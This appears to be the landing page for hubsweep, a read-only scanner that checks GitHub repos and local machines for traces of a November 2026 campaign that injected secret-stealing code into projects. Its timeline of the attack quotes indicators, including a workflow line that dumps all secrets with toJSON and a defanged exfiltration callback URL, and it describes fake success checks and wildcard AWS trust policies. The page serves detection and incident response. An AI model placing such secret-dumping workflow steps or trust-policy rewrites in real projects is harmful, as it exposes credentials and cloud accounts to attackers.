You build faster than ever. So do they.

AI lets one person ship what used to take a team. It also lets attackers break in at the same speed. On 10 November 2026, stolen GitHub logins were used to slip password-stealing code into more than 60,000 projects, and wipe the evidence within a minute.

hubsweep is one command that checks every GitHub project you can reach, and your computer, for the marks that attack leaves. It changes nothing, and tells you plainly what it found.

        Why this matters now
        
Your GitHub holds the keys to everything else

        
If you're not following security news, here is the short version. Your code isn't the prize. The prize is what your code is allowed to touch.

      

      

        
More keys than ever
Every AI model, cloud account, payment provider and database your product uses has a key, and those keys sit in GitHub so your builds can run. One stolen login opens all of them.

        
More doors than ever
AI helps you spin up a new repo, workflow or side project in an afternoon. Each one is another place a stolen token can write to, and fewer people are watching each one.

        
Attackers automate too
This attack hit 61,764 repos in about a day. No person typed that. The same tools that make you fast make them fast, and they only need one of your projects to be open.

        
Built to go unnoticed
The harmful change was undone within a minute and its logs deleted. Most owners never saw a thing. Not seeing a problem is not the same as not having one.

      

      

        It's a simple tool
        
One command. Five to sixty minutes, depending on how many projects you have. A report that says clean, look at this, or act now, in plain words, with what to do next. Nothing to buy, nothing to sign up for, and nothing it can break.

Pick the one that sounds like you.

      

      

        
        
        
        
        
      

      

        
"I'm not a security person. I just build things."

          
That's exactly who these campaigns hit: people with lots of small repos, a few API keys, and no one else watching. You don't need to understand workflows or tokens to use hubsweep. Ask Claude "have my repos been hit?" and it checks your setup, tells you what it will do in plain words, asks before starting, and explains the answer.

        
  • Peace of mind in one run, not a security course
  • A short list of what to do if anything turns up, in order
  • Works on your laptop: Mac, Windows or Linux

      

      

        
"Did anything run in our CI that we didn't write?"

          
hubsweep reads what each push actually changed, even if it was reverted a minute later; spots deleted workflow runs by the gaps in run numbers; flags success checks posted by a person rather than your CI app; and catches new toJSON(secrets) and install hooks, campaign or not. On your laptop it looks at scheduled jobs and every checkout for planted files.

        
  • Zero dependencies, Node 22+, GET requests only via your own gh
  • JSON report and exit codes for scripting
  • Rule packs as JSON: a new campaign is a new file, not a code change

      

      

        
"What does this mean for what we ship?"

          
A stolen build secret can mean a poisoned release, a leaked customer database or a cloud bill you didn't run up. hubsweep gives you a fast, honest answer to "were we touched?" so you can keep the roadmap moving, or know early that you need to stop and fix something.

        
  • A one-page report anyone on the team can read
  • Clear severity: act now, look at this, or couldn't check
  • Fits a release checklist: run it before a launch

      

      

        
"Show me the evidence, and what you couldn't see."

          
Every finding links to the PR, commit, branch event or run gap that triggered it, with the rule pack that matched and its public source. Anything unreadable is listed under "Couldn't check", never counted as clean. Reports never contain secret values. Indicators are versioned data with credits, so you can review them, add your own, or switch a pack off.

        
  • Read-only by design and by test; nothing installs without a yes
  • Covers the account checks GitHub keeps from tools, as a checklist
  • Markdown and JSON reports to attach to an incident record

      

      

        
"Are we, and our clients, exposed?"

          
AI is multiplying the repos, automations and keys your teams and contractors hold. hubsweep sweeps every org a login can reach, so one person can answer for a whole estate in an hour, including client orgs you work in. When the next campaign lands, it's a new rule pack and the same command.

        
  • An estate-wide answer, not a sample
  • Free and MIT licensed: no procurement, no data leaves your machine
  • Repeatable: the same sweep for every new advisory

      

    

  


  

    

      

        What happened
        
Three moves, under a minute

        
For each repo a stolen token could write to, the attacker ran the same routine. The probe PR is noisy; the rest is built to vanish.

      

      

        

          T+0 · from 12:45 UTC, 10 Nov
          
1. Probe

          
Open a pull request from a wfx-docs branch. If it works, the token can write here.

          
docs: dependency audit notes
"Routine dependency audit notes."

        

        

          T+seconds
          
2. Payload

          
Push the stealer one of three ways: about 1,500 lines injected into a workflow, an npm postinstall hook, or a throwaway build-audit-*.yml on a chore/ branch. It takes every secret, then trades OIDC tokens for AWS, GCP and Azure sessions.

          
WF_SECRETS: "${{ toJSON(secrets) }}"
WF_CALLBACK: "http://194.150.166[.]244:8080/exfil"

        

        

          T+<1 min
          
3. Vanish

          
Revert the commit, delete the branch, delete the workflow run and its logs. Often the only trace is a missing run number.

          
Run #41  ✓ build
Run #42  (gone)
Run #43  ✓ build

        

      

      
It also posts fake "success" checks so branch protection waves it through, rewrites AWS trust policies to "AWS": "*" and adds Azure federated credentials named wfx-ci-…, which outlive a rotated secret. Accounts hit by October's GhostAction campaign were hit more often. Source: Aikido Security.

    

  


  

    

      

        What hubsweep does
        
Step by step, before it starts

        
Every run first checks what it needs and shows you this plan. Run it with --plan to stop there and read it, without touching a single repo.

      

      

        
    
          
  1. Checks your setupNode 22 or newer, the GitHub CLI installed and signed in, what your token can see, how much of GitHub's hourly request budget is left, git, and a folder for the report. If gh is missing it asks before installing it.
    2. 
          
  2. Lists your reposEvery repo your login can reach: your own, ones you collaborate on, your organisations'. Or just the owners or repos you name.
    3. 
          
  3. Reads the cheap signs everywhereRecent pull requests, branch names, and the file list on each default branch.
    4. 
          
  4. Digs where something movedFor repos pushed to in the window: the activity log (even branches deleted since), what each push changed (even if reverted a minute later), and Actions run numbers, so deleted runs show as gaps.
    5. 
          
  5. Checks your computer, if you askCron, launch agents, systemd user units or Windows scheduled tasks, and the git checkouts in folders you name.
    6. 
          
  6. Writes a reportHigh findings, things to check, what it couldn't read, and a checklist for the account pages GitHub keeps from tools.
    7. 
        

        

          
What it won't do

          
    
            
  • Change anything. It makes GitHub GET requests through your own gh login, and reads files.
    • 
            
  • Print or save a secret's value. Reports hold names, paths, commit messages and links.
    • 
            
  • Send your data anywhere. The only network traffic is your own requests to GitHub.
    • 
            
  • Call something clean that it couldn't read. Gaps get their own section.
    • 
            
  • Install anything without asking. The one thing it offers is the GitHub CLI.
    •

        Run it
        
Sweep your own estate

        
Needs Node 22+ and the GitHub CLI. Windows, macOS and Linux. A big account takes 20 to 60 minutes; it paces itself to GitHub's rate limit.

      

      

        

          
Look first

          
Checks your setup and shows the steps. Reads no repo.

          
npx --yes github:pacphi/hubsweep --plan

        

        

          
Sweep GitHub

          
Every repo your login can reach. Writes hubsweep-report.md.

          
npx --yes github:pacphi/hubsweep

        

        

          
And this computer

          
Adds scheduled jobs and the git checkouts under a folder.

          
npx --yes github:pacphi/hubsweep --local ~/code

        

        

          
Ask Claude

          
In Claude Code, add the plugin, then ask "Have my repos been hit by wfx-loot?" Claude checks your setup, explains each step and asks before it starts. For Claude chat, upload the skill zip from the latest release.

          
/plugin marketplace add pacphi/hubsweep

        

      

      
If it finds something: lock your account first (sessions, tokens, SSH keys, authorised apps), then rotate every secret and cloud role the affected workflows could reach, then clean up. Keep a copy of what you found before deleting anything.
